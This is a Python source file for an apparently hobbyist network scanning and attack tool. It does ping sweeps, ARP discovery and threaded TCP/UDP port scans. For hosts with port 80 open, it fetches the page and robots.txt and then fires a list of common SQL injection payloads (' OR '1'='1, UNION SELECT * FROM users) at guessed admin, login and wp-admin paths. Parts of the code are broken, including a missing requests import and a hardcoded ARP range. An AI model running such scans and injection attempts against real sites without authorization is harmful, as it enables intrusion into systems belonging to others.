import ipaddress
import threading
import time
from helper import *
from icmplib import multiping
from scapy.all import ARP, Ether, srp

# NEEDS REFACTORING

class Scanner:
    def pingsweep(self, address):
        addresses = []
        alive = []
        for subnet in range(255):
            addresses.append(f"{address}.{subnet}")
            
        hosts = multiping(addresses, count=5)
        for host in hosts:
            if host.is_alive:
                alive.append(host)
        
        if len(alive) > 0:   
            choice = input(f"{len(alive)} alive hosts found, do you want to list them? [y/n] ")
            if choice == "y":
                for a in alive:
                    print(a)
        else:
            print(f"No alive hosts found for {address}")
            
    def arp_scan(self, ip_range):
        local_ip = get_local_ip()
        network = ipaddress.ip_network(f"{local_ip}/{ip_range}", strict=False)
        
        arp = ARP(pdst="192.168.0.0/" + ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        
        answered, unaswered = srp(packet, timeout=2)
        if len(answered) > 0:
            choice = input(f"Sent {len(answered) + len(unaswered)} ARP packets and got {len(answered)} responses, do you want to list available hosts? [y/n] ")
            if(choice == "y"):
                for ans in answered:
                    ip, mac = ans[1].psrc, ans[1].hwsrc
                    print(ip, '\t\t' + mac) 
        else:
            print(f"Sent {len(answered) + len(unaswered)} ARP packets and found no available hosts")
            
    def tcp_port_scan(self, host, port, proxy):
        open_ports = {}
        start = time.time()
        
        if port:
            print(f"Attempting connection to {host}:{port}")
            connection = connect_tcp(host, port)
            if connection:
                if port == "80":
                    self.att_port_80(host, proxy)
                else:
                    print(f"Connection to port {port} succeeded, port is open")
            else:
                print(f"Port {port} on the {host} subnet is not open or protected by a firewall")
        else:
            threads = []
            next_threads = []
            for p in range(1, 1024):
                t = threading.Thread(target=connect_tcp_thread, args=(host, open_ports, p))
                if p <= 512:
                    threads.append(t)
                else:
                    next_threads.append(t)
                
            split_threads(threads, next_threads) # split to avoid OSError
            end = time.time()
                
            if len(open_ports) > 0:
                choice = input(f"{len(open_ports)} open ports found in {format(end - start)} seconds, do you want to list them? [y/n] ")
                if choice == "y":
                    for p in open_ports.items():
                        if p[1]:
                            print(f"Found open port {p[0]}: {p[1]}")
                        else:
                            print(f"Found open port {p[0]}")

                    for i in open_ports.items():
                        if i[0] == 80:
                            self.att_port_80(host, proxy)
            else:
                print(f"All well-known ports on the {host} subnet are closed or protected by a firewall")
                
    def udp_port_scan(self, host, port, proxy):
        open_ports = {}
        start = time.time()
        
        if port:
            print(f"Attempting connection to {host}:{port}")
            connection = probe_udp(host, port)
            if connection:
                print(f"Connection to port {port} succeeded, port is open")
                if port == "80":
                    self.att_port_80(host, proxy)
            else:
                print(f"Port {port} on the {host} subnet might be closed, try a tcp scan if you think this was caused by packet loss")
        else:
            threads = []
            next_threads = []
            for p in range(1, 1024):
                t = threading.Thread(target=probe_udp_thread, args=(host, open_ports, p))
                if p <= 512:
                    threads.append(t)
                else:
                    next_threads.append(t)
                
            split_threads(threads, next_threads) # split to avoid OSError
            end = time.time()
                
            if len(open_ports) > 0:
                choice = input(f"{len(open_ports)} open ports found in {format(end - start)} seconds, do you want to list them? [y/n] ")
                if choice == "y":
                    for p in open_ports.items():
                        if p[1]:
                            print(f"Found open port {p[0]}: {p[1]}")
                        else:
                            print(f"Found open port {p[0]}")
                            
                    for i in open_ports.items():
                        if i[0] == 80:
                            self.att_port_80(host, proxy)
            else:
                print(f"Couldn't connect to any well-known port on the {host} subnet, try a tcp scan if you think this was caused by packet loss")
                
    def att_port_80(self, host, proxy):
        choice = input(f"\nPort 80 is open, do you want to fetch the contents of {get_domain(host)}, which is hosted on this ip? [y/n] ")
        if choice == "y":
            if not proxy.proxy:
                p_choice = input("\nYou have no active proxy, do you want to use one before attacking this web page? [y/n] ")
                if p_choice == "y":
                    proxy.get_proxy()
            get_content(host, proxy, d_ipv4=None)

        choice_2 = input(f"\nDo you want to try and fetch the robots.txt file from {get_domain(host)}? [y/n] ")
        if choice_2 == "y":
            try:
                r = requests.get(f"http://{get_domain(host)}/robots.txt")
                if "404" not in r.text:
                    print(f"\n{r.text}")
                else:
                    print(f"Unable to fetch robots.txt: file not found in {get_domain(host)}")
            except requests.exceptions.MissingSchema:
                print(f"Unable to fetch robots.txt: file not found in {get_domain(host)}")
            
        choice_3 = input(f"\nDo you want to try common sql injection payloads on {get_domain(host)}? [y/n] ")
        if choice_3 == "y":
            extensions = ["", ".html", ".htm", ".asp", ".aspx", ".jsp", ".php", ".jspx", ".jspx", ".jspx", ".jspx", ".jspx"]
            directories = ["", "admin", "login", "wp-admin", "cms", "panel", "dashboard", "config", "includes"]
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' UNION SELECT * FROM users --",
                "' AND 1=1 --",
                "' OR 1=1 --",
                "1' OR '1'='1",
                "1' UNION SELECT * FROM users --",
                "1' AND 1=1 --",
                "1' OR '1'='1 --",
                "1' OR 1=1 --"
            ]

            for d in directories:
                for ext in extensions:
                    url = f"{get_domain(host)}/{d}{ext}"
                    succeeded = False
                    for payload in payloads:
                        try:
                            response = requests.get(f"{url}?id={payload}", timeout=5, proxies=proxy)
                            if "error" in response.text.lower():
                                print(f"[!] Possible SQL injection vulnerability found on {url} with payload: {payload}")
                                print(f"Response: {response.text[:200]}...")
                                succeeded = True
                            else:
                                print(f"[+] No SQL injection detected on {url} with payload: {payload}")
                        except requests.exceptions.RequestException as e:
                            continue
                        
                    if not succeeded:
                        print("None of the common sql injection payloads worked")